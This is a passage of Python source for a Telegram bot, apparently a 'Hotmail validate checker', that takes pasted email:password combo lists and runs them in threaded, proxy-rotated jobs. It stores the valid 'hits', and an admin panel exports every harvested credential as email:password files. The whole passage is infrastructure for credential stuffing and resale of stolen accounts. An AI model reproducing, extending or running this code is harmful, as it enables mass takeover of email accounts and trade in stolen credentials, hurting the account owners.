    lines, seen = [], set()
    for l in text.splitlines():
        l = l.strip()
        if ":" not in l:
            continue
        k = l.lower()
        if k in seen:
            continue
        seen.add(k)
        lines.append(l)
    if not lines:
        await update.message.reply_text("No valid email:pass found.")
        return ConversationHandler.END
    used = get_daily_used(uid)
    lim = user_limit(uid)
    left = max(0, lim - used) if not is_admin(uid) else len(lines)
    if not is_admin(uid):
        if left <= 0:
            await update.message.reply_text("Daily limit finished.")
            return ConversationHandler.END
        lines = lines[:left]
    add_daily_used(uid, len(lines))
    threads = int(get_setting("threads", str(DEFAULT_THREADS)))
    proxies = get_proxies()
    keywords = get_user_keywords(uid) or ALL_KEYWORDS[:30]
    context.user_data["await"] = None
    job = {"uid": uid, "combos": lines, "proxies": proxies, "threads": threads,
           "keywords": keywords, "chat_id": update.effective_chat.id}
    with job_lock:
        can_run = running_count < MAX_PARALLEL
        if not can_run:
            queue_list.append(job)
            pos = len(queue_list)
            await update.message.reply_text(
                f"📋 Added to Queue!\\n📊 `{len(lines)}` accounts\\n⏳ Position: #{pos}"
            )
            return ConversationHandler.END
    await update.message.reply_text(
        f"🚀 Starting `{len(lines)}` · threads `{threads}` · KW `{len(keywords)}`",
        parse_mode="Markdown"
    )
    t = threading.Thread(
        target=run_job,
        args=(uid, lines, proxies, threads, keywords, update.effective_chat.id),
        daemon=True
    )
    t.start()
    return ConversationHandler.END

async def cb_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.edit_message_text("Admin only.", reply_markup=main_kb(q.from_user.id))
        return
    n = count_all_hits()
    thr = get_setting("threads", str(DEFAULT_THREADS))
    text = (
        f"🛠 *Admin Panel*\\nHits: `{n}`\\nThreads: `{thr}` · Proxies: `{len(get_proxies())}`\\n"
        f"Queue: `{len(queue_list)}` · Running: `{running_count}`"
    )
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=admin_kb())

async def cb_adm_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    conn = db()
    users = conn.execute("SELECT COUNT(*) AS c FROM users").fetchone()["c"]
    hits = conn.execute("SELECT COUNT(*) AS c FROM hits").fetchone()["c"]
    valid = conn.execute("SELECT COUNT(*) AS c FROM hits WHERE status='valid'").fetchone()["c"]
    conn.close()
    text = f"Users: `{users}`\\nHits: `{hits}` (valid `{valid}`)"
    await q.edit_message_text(text.replace("\\\\n", "\\n"), parse_mode="Markdown", reply_markup=admin_kb())

async def cb_adm_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    rows = fetch_all_hits()
    if not rows:
        await q.edit_message_text("No hits.", reply_markup=admin_kb())
        return
    path = f"/tmp/admin_hits_{int(time.time())}.txt"
    with open(path, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(f"{r['email']}:{r['password']}|{r['status']}|{r['keywords'] or ''}\\n")
    clear_all_hits()
    await context.bot.send_document(
        chat_id=q.message.chat_id, document=InputFile(path),
        caption=f"All hits ({len(rows)}) — cleared."
    )
    await q.edit_message_text("Downloaded + cleared.", reply_markup=admin_kb())

async def cb_adm_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "threads"
    await q.edit_message_text(
        "Send thread count (5–150):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_THREADS

async def recv_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "threads":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    try:
        n = max(5, min(150, int(update.message.text.strip())))
        set_setting("threads", str(n))
        context.user_data["await"] = None
        await update.message.reply_text(f"Threads → `{n}`", parse_mode="Markdown", reply_markup=admin_kb())
    except Exception:
        await update.message.reply_text("Invalid number.")
    return ConversationHandler.END

async def cb_adm_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "proxies"
    await q.edit_message_text(
        "Send proxies (one per line):\\n`ip:port` or `user:pass@ip:port`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_PROXIES

async def recv_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "proxies":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    text = update.message.text or ""
    conn = db()
    n = 0
    for line in text.splitlines():
        p = line.strip()
        if not p:
            continue
        if not p.startswith("http"):
            p = "http://" + p
        try:
            conn.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (p,))
            n += 1
        except Exception:
            pass
    conn.commit()
    conn.close()
    context.user_data["await"] = None
    await update.message.reply_text(f"Added `{n}` proxies.", parse_mode="Markdown", reply_markup=admin_kb())
    return ConversationHandler.END

async def cb_adm_clr_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    conn = db()
    conn.execute("DELETE FROM proxies")
    conn.commit()
    conn.close()
    await q.edit_message_text("Proxies cleared.", reply_markup=admin_kb())

async def cb_adm_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "limit_uid"
    await q.edit_message_text(
        "Send target user Telegram ID:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_LIMIT_UID

async def recv_limit_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "limit_uid":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    try:
        tid = int(update.message.text.strip())
        ensure_user(tid)
        context.user_data["limit_target"] = tid
        context.user_data["await"] = "limit_val"
        await update.message.reply_text(f"User `{tid}` — send new daily limit:", parse_mode="Markdown")
        return WAIT_LIMIT_VAL
    except Exception:
        await update.message.reply_text("Invalid ID.")
        return ConversationHandler.END

async def recv_limit_val(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "limit_val":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    try:
        n = max(0, int(update.message.text.strip()))
        tid = context.user_data.get("limit_target")
        set_user_limit(tid, n)
        context.user_data["await"] = None
        await update.message.reply_text(f"User `{tid}` limit → `{n}`", parse_mode="Markdown", reply_markup=admin_kb())
    except Exception:
        await update.message.reply_text("Invalid number.")
    return ConversationHandler.END

async def cb_adm_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "custom_uid"
    await q.edit_message_text(
        "Send user ID to GRANT custom keyword access:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_CUSTOM_UID

async def recv_custom_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "custom_uid":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    try:
        tid = int(update.message.text.strip())
        ensure_user(tid)
        set_custom_kw(tid, True)
        context.user_data["await"] = None
        await update.message.reply_text(
            f"User `{tid}` → custom keywords unlocked",
            parse_mode="Markdown", reply_markup=admin_kb()
        )
    except Exception:
        await update.message.reply_text("Invalid ID.")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["await"] = None
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text("Cancelled.", reply_markup=main_kb(update.effective_user.id))
    else:
        await update.message.reply_text("Cancelled.", reply_markup=main_kb(update.effective_user.id))
    return ConversationHandler.END

def main():
    if not BOT_TOKEN or BOT_TOKEN.startswith("PUT_"):
        print("Set BOT_TOKEN env var")
        return
    if not ADMIN_IDS:
        print("WARNING: ADMIN_IDS empty")
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(cb_start_check, pattern="^start_check$"),
            CallbackQueryHandler(cb_adm_threads, pattern="^adm_threads$"),
            CallbackQueryHandler(cb_adm_proxies, pattern="^adm_proxies$"),
            CallbackQueryHandler(cb_adm_limit, pattern="^adm_limit$"),
            CallbackQueryHandler(cb_adm_custom, pattern="^adm_custom$"),
        ],
        states={
            WAIT_COMBOS: [
                MessageHandler(filters.TEXT | filters.Document.ALL, recv_combos),
                CallbackQueryHandler(cancel, pattern="^home$"),
            ],
            WAIT_THREADS: [
                MessageHandler(filters.TEXT, recv_threads),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_PROXIES: [
                MessageHandler(filters.TEXT, recv_proxies),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_LIMIT_UID: [
                MessageHandler(filters.TEXT, recv_limit_uid),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_LIMIT_VAL: [
                MessageHandler(filters.TEXT, recv_limit_val),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_CUSTOM_UID: [
                MessageHandler(filters.TEXT, recv_custom_uid),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(cancel, pattern="^(home|admin)$")],
        allow_reentry=True,
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(cb_home, pattern="^home$"))
    app.add_handler(CallbackQueryHandler(cb_noop, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(cb_profile, pattern="^profile$"))
    app.add_handler(CallbackQueryHandler(cb_speed, pattern="^speed_info$"))
    app.add_handler(CallbackQueryHandler(cb_status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(cb_kw_menu, pattern="^kw_menu:"))
    app.add_handler(CallbackQueryHandler(cb_kw_tog, pattern="^kw_tog:"))
    app.add_handler(CallbackQueryHandler(cb_kw_all, pattern="^kw_all:"))
    app.add_handler(CallbackQueryHandler(cb_kw_none, pattern="^kw_none:"))
    app.add_handler(CallbackQueryHandler(cb_my_hits, pattern="^my_hits$"))
    app.add_handler(CallbackQueryHandler(cb_hits_page, pattern="^hits_page:"))
    app.add_handler(CallbackQueryHandler(cb_hit_dl, pattern="^hit_dl:"))
    app.add_handler(CallbackQueryHandler(cb_hit_del, pattern="^hit_del$"))
    app.add_handler(CallbackQueryHandler(cb_admin, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(cb_adm_stats, pattern="^adm_stats$"))
    app.add_handler(CallbackQueryHandler(cb_adm_dl, pattern="^adm_dl$"))
    app.add_handler(CallbackQueryHandler(cb_adm_clr_proxy, pattern="^adm_clr_proxy$"))
    log.info("HOTMAIL VALIDATE CHECKER | @TheTalha47 starting")
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            raise RuntimeError("closed")
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
